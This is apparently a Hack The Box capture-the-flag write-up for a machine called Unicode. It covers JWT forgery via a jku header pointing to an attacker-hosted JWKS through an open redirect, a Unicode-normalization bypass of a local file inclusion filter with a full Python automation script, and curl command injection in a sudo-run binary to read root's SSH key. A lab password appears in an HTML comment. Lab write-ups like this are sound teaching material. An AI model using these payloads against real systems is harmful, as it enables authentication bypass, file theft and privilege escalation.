![](unicode_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>

# Enumeration

**IP-ADDR:** 10.10.11.126 hackmedia.htb

**nmap scan:**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: E06EE2ACCCCCD12A0FD09983B44FE9D9
|_http-generator: Hugo 0.83.1
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hackmedia
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

web app hava login and register option and `/redirect` looks like a open redirect on not useful right now.
```bash
❯ echo http://$ip | hakrawler
http://10.10.11.126/
http://10.10.11.126/login/
http://10.10.11.126/register/
http://10.10.11.126/redirect/?url=google.com
```

register with new account and logged,

![](screenshots/webapp-logged-in.png)

One thing to be noted that, it is possible to enumerate exist users with some scripting/burp-intruder because application gives explicit error message if user already exists.

![](screenshots/user-enum.png)

There are some funcanalities but looks like none of them really works, only one thing looks interesting is the cookie which comtains a auth token.

![](screenshots/auth-token.png)


# Foothold

## JWT jku bypass

looks like a jwt token

![](screenshots/jwt-tool-decode.png)

Token contains jku value: `jku = "http://hackmedia.htb/static/jwks.json"`

* Got a hostname: `hackmedia.htb`
* jku stands for JWK Set URL.
  * jku Header points to a URL containing the JWKS file that holds the Public Key for verifying the token.

    ![](screenshots/jwks-file.png)

There is a way to bypass token verification from jku header: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jku

For the, we need to create a public-private key and a jwks file hosted on our server.

First you need to create a new certificate with new private & public keys -
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

Then to create the new JWT with the created `publickey.crt`(public) and `pkcs8.key`(private) keys and pointing the parameter jku to the certificate created.

**HEADER**
```json
{"typ":"JWT","alg":"RS256","jku":"http://attacker.server/jwks.json"}
```

**PAYLOAD**
```json
{"user":"admin"}
```

![](screenshots/generate-token.png)

In order to create a valid jku certificate you can download the original one anche change the needed parameters.
```bash
wget http://hackmedia.htb/static/jwks.json
```

You can obtain the parametes "`e`" and "`n`" from a public certificate using python -
* There is a issue with formatting hacktricks shows this value in hex format but our target server using possibly base64 format. We can still get these values with python but with different module and different techniques.
```python
from jwcrypto import jwk
import json
with open("keypair.pem", "rb") as pemfile:
    key = jwk.JWK.from_pem(pemfile.read())
jwks = key.export_public()
print(json.loads(jwks)['n'])
print(json.loads(jwks)['e'])
```

![](screenshots/get-e-n.png)

Replace `e` and `n` value in orignal `jwks.json` with new values.
```json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "5VB6YkmCCvY7UTdKNh4jUSxySy8Kew9A_ZIb3zilwMzXOgg8gThoicyR9pQmpjKrNWYz3eBueDkkjc7gHaN7H97rbpZq01NxsKGxWGqgO7JVSjq0o_YLPBztGFZ-R0tqZ-wzObuL8ZDnbm0vWdgFtxSVNAGB8eL0S-t9wMY6ALz8KXbYyWarH1FJpgYFtzrYRE6oJQsPCfgCzWIkKEV-dUyAcn7B2sVKjceEsI1JoKonQU4X6RJmU8PHFcjFqix2_fWUhVhLjVcKDHDNECY-h3jfd-1j_m0Na1F5eP87s_hSLdJVkaIiI4v6lOpFR7BxbN-UN9aCo_PE8thW3TavSw",
            "e": "AQAB"
        }
    ]
}
```

<!--
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjI0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.hWsEwHVuzmTfvZyDQ6GoHECL0Z2sKqqTWOLYX9c-rrfXtY-lhGIfp2wK_VJFdIPH_ipfRTJsPf4iStj6woAjZYea5Gcrn6jd4uYceupcZMue29HWduAMpfHD1kEoIQLzK4JvhFEURK0Z8B5oYC-gk4kRn9DEMzy2mQuyxt2vDELfaIW6ks8r--D8w8wsFZpcee1XDzT5FQjTUvPR36z384o2-NTEAAXgDTzuhqhIkPTF4dzX1pVYnzOj33Aj_GI_p14wvMEWOZDFIUeTsXxsNW1NZjdV3M8kHHqsDK7ItwDalereJ9MK0s3q3Oe0-4JOJorT_gI-M7vKJa3ZoGOpkQ
-->

Now, Host that `jwks.json` file on http server And GET request to `/dashboard` with modified auth token but got validation error: **jku validation failed**.

![](screenshots/jku-valid-error.png)

That means there are some filters and black/white list that preventing this.

Found this on google which remind me something: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/jwt-forgery-via-chaining-jku-parameter-with-open-redirect-/

At the begining i notice a open redirect from `http://10.10.11.126/redirect/?url=google.com`. We can use it and try to bypass that filter.

After some testing i found out possible filters.
* Application explicitly checks for `http://hackmedia.htb/static/`
* Does not support any other port besides port 80.

Possible way to bypass.
* use `../` after `static/` to go back to `/redirect`
* run http server with port 80

Final jwt token payload and header looks like this; Get new token with these values.
```json
{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/static/../redirect/?url=10.10.14.24/jwks.json"}
```
```json
{"user":"admin"}
```

And finally got the admin panel

![](screenshots/admin-dash.png)


## lfi

There are only two working link on the admin dashboard. Both has same directory and parameter only value is diffrent
```bash
http://hackmedia.htb/display/?page=monthly.pdf
http://hackmedia.htb/display/?page=quarterly.pdf
```

based on the parameter values, this could be a lfi bug.

Tried some `../../` and immediately redirect to `/filenotfound` with a message: "we do a lot input filtering you can never bypass our filters.Have a good day"

![](screenshots/lfi-filter.png)

That means this is a lfi but there are some filters we need to bypass.

* Good resourse on WAF bypass: https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html

And based on the box name, successfully bypass WAF with unicode character `︰` which Normalization as `..`

![](screenshots/lfi-bypassed.png)

sake of the learning purpose, i tried to create a python script to automate all of this.
```py
import jwt
import json
from Crypto.PublicKey import RSA
import requests as r
from jwcrypto import jwk
import argparse
import re
import netifaces as ni
# from os import getcwd

host = 'http://hackmedia.htb'  # **IMPORTANT** add "10.10.11.126 hackmedia.htb" in python "/etc/hosts" file.
files_path = '.'  # getcwd()
ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
jwks_serv_ip = ip


class GenTokenAndJWKS:
    def __init__(self):
        # Generate RSA key
        key = RSA.generate(2048)
        private_key = key.exportKey('PEM')
        public_key = key.publickey().exportKey('PEM')
        # Extract "n" and "e" value
        key = jwk.JWK.from_pem(public_key)
        jwks = key.export_public()
        # print(json.loads(jwks))

        # Generate modified "jwks.json" file
        org_jwks = r.get(f'{host}/static/jwks.json').text
        # print(org_jwks)
        json_object = json.loads(org_jwks)
        json_object['keys'][0]['n'] = json.loads(jwks)['n']
        json_object['keys'][0]['e'] = json.loads(jwks)['e']
        # print(json.dumps(json_object, indent=4))
        self.modified_jwks = json_object

        # Using Open redirect to bypass jku validation
        jwks_server = f"{host}/static/../redirect/?url={jwks_serv_ip}/jwks.json"
        # Generate jwt token
        self.jwt_token = jwt.encode({"user": "admin"}, private_key, algorithm="RS256", headers={"jku": jwks_server})
        # print(self.jwt_token)
        # decoded = jwt.decode(jwt_token, public_key, algorithms=["RS256"])
        # print(decoded)


parser = argparse.ArgumentParser()
parser.add_argument('--genFiles', action='store_true', help="Generate jwks.json and token.")
parser.add_argument('--lfi', help="lfi attack.")
args = parser.parse_args()


def getValues():
    return GenTokenAndJWKS()


def GenRequiredFiles():
    values = getValues()
    # write modified jwks in "jwks.json"
    print(f"[+] 'jwks.json' and 'jwt.token' will be saved in[CWD]: {files_path}")
    a_file = open(f"{files_path}/jwks.json", "w")
    json.dump(values.modified_jwks, a_file, indent=4)
    a_file.close()

    # Write jwt token in a file
    a_file = open(f"{files_path}/jwk.token", "w")
    a_file.write(values.jwt_token)
    a_file.close()


if args.genFiles:
    GenRequiredFiles()

try:
    jwt_token = open(f"{files_path}/jwk.token", "r").read()
    cookies_dict = {"auth": jwt_token}
    if args.genFiles:
        # Test token
        input(f"[+] Run 'sudo python3 -m http.server 80' on CWD before continue[ENTER]...")
        rspn = r.get(f"{host}/dashboard/", cookies=cookies_dict, allow_redirects=False)
        print(f"[!] Token take us to: {re.findall(r'<title>(.*?)</title>', rspn.text)[0]}")
except FileNotFoundError as e:
    print(e)


def lfi(payload):
    lfi_rspn = r.get(f"{host}/display/?page={payload}", cookies=cookies_dict)
    if 'Unauthorized' in lfi_rspn.text:
        exit('Unauthorized')
    elif re.search(r'<h3>(.*?)</h3>', lfi_rspn.text):
        print(f"[-] {re.findall(r'<h3>(.*?)</h3>', lfi_rspn.text)[0]}!")
    elif re.search(r'<title>(.*?)</title>', lfi_rspn.text):
        print(re.findall(r'<title>(.*?)</title>', lfi_rspn.text)[0])
    else:
        print(lfi_rspn.text)


if args.lfi:
    path = f"︰/︰/︰/︰/︰/︰{args.lfi}"
    lfi(path)
```


### burp issue

while sending request with unicode characters burp automatically convert these character before forwarding and breaks the bypass.

![](screenshots/burp-annoying-normalizer.png)

from level of my knowledge, Burp only takes every character as single byte character.

Hex value of **`︰`** >> `ef b8 b0` which represent of three unicode characters - 

|Hex|unicode char|
|---|------------|
|`ef`|**`ï`**|
|`b8`|**`¸`**|
|`b0`|**`°`**|

And combinations of these three characters creats a unicode character **vertical two dot leader** `︰`

and when we past `︰` it converted to `0`.

to solve this we need to load all character separately `ï¸°` which normalize to `︰`

to make it easy we can encode `︰` in base64 and after pasting in burp decode base64.
```bash
❯ echo -n '︰' | base64
77iw
```

![](screenshots/burp-base-to-unic.gif)

from nginx config file found about `db.yaml`

s![](screenshots/nginx-config.png)

And, From `db.yaml` get user creds.

![](screenshots/user-creds.png)

* Worked for user `code` ssh login. <!--code:B3stC0d3r2021@@!-->

# Privesc

User "code" allowed to run `/usr/bin/treport` as root with no password.
```bash
code@code:~$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
```

After some testing, Found out
* This is a python script and possible created with `pyinstaller`
* There are 4 options it in program

  ![](screenshots/pyexe-opts.png)

* First 2 options don't return anything intresting.
* option 3 fetching urls and it's using `curl`

  ![](screenshots/curl-in-pyexe.png)

* And special characters are not allowed

  ![](screenshots/pyexe-not-spl-char.png)


## Python byte-codes decompile

There is a script which we can use to extract python byte-codes: [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor).

![](screenshots/extract-pyc.png)

So, There is a well-known tool for decompiling python3 byte-codes [python-decompile3](https://github.com/rocky/python-decompile3) but there are some [issues](https://github.com/rocky/python-decompile3/issues/45) going on on this project. 

but there is a another tool not fully stable but it worked: [pycdc](https://github.com/zrax/pycdc).

Setup pycdc and build executable
```bash
git clone https://github.com/zrax/pycdc && cd pycdc
cmake .
cmake --build .
```

Then use `pycdc` to extract source from `treport.pyc` file
```bash
❯ ./pycdc treport.pyc > treport.py
Unsupported opcode: <255>
Unsupported opcode: <255>
Unsupported opcode: <255>
```

Only information get form python source is that there is a command injection in option 3 and most of the special character are blacklisted.

![](screenshots/treport-source.png)


## Command injection

There are so many useful character are blacklisted but not all.

* blacklisted: ``$`;&|||><?'@#$%^()``
* allowed: `*[]-"{}\:,./+=!~`

And there is a flag `-K` which allow user to load config file

![](screenshots/curl-flag.png)

and there is a bash trick to execute a command with its argument without space using `{}` and argument separated with `,`
```bash
❯ bash -c '{uname,-s}'
Linux
```

it is possible to read files from stderr of curl with `-K` but this messed-up the file.
```bash
{-K,/root/.ssh/id_rsa}
```

![](screenshots/read-root-rsa.png)

There is a one comparison in the python source that blacklisting some protocols
```py
if 'file' in ip and 'gopher' in ip or 'mysql' in ip:
print('INVALID URL')
```

But this is case sensitive and eassliy bypass capital character like `File`, `Gopher`, `Mysql` without affecting the behaviour in curl command.
```bash
code@code:~$ curl File:///etc/hostname
code
```

but there is one more error, in the source code curl command outputting in the `/root/reports/` directory
```py
cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
```

but it looks like that direcotry in not presented there.

![](screenshots/no-dir-error.png)


To bypass this with `file` protocol, we can combine it with our first bypass technique and use with `--create-dirs` flag which, When used in conjunction with the `-o`, `--output` option, curl will create the necessary local directory hierarchy as needed.
```bash
{File:///root/.ssh/id_rsa,--create-dirs}
```

![](screenshots/root-rsa.png)

But that key is not working.

but we are able to read the root flag so thats it for this.